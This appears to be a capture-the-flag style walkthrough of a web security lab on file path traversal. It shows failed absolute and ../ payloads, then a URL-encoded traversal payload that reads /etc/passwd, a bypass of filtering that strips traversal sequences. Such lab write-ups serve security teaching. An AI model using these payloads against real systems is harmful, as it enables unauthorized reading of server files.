# File path traversal, traversal sequences stripped with superfluous URL-decode

## Information

- Lab: File path traversal
- Level: PRACTITIONER
- Description:

    ![](<Images/File path traversal, traversal sequences stripped with superfluous URL-decode 0.png>)

## Solution

Access the website and use Burp to capture the requests for the images on the website.

First, I tried an absolute path payload:

```text
/etc/passwd
```

![](<Images/File path traversal, traversal sequences stripped with superfluous URL-decode 1.png>)

As we can see, this method did not work.

It seems that the server handles the path as a relative path.

Then I tried this payload:

```text
../../../../../../etc/passwd
```

I still received an error.

![](<Images/File path traversal, traversal sequences stripped with superfluous URL-decode 2.png>)

Next, I tried to URL encode the payload to bypass the validation.

```text
. --> %2e
/ --> %2f
```

Payload:

```text
%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
```

After sending the payload, I was able to read the content of `/etc/passwd`.

![](<Images/File path traversal, traversal sequences stripped with superfluous URL-decode 3.png>)

The lab was solved.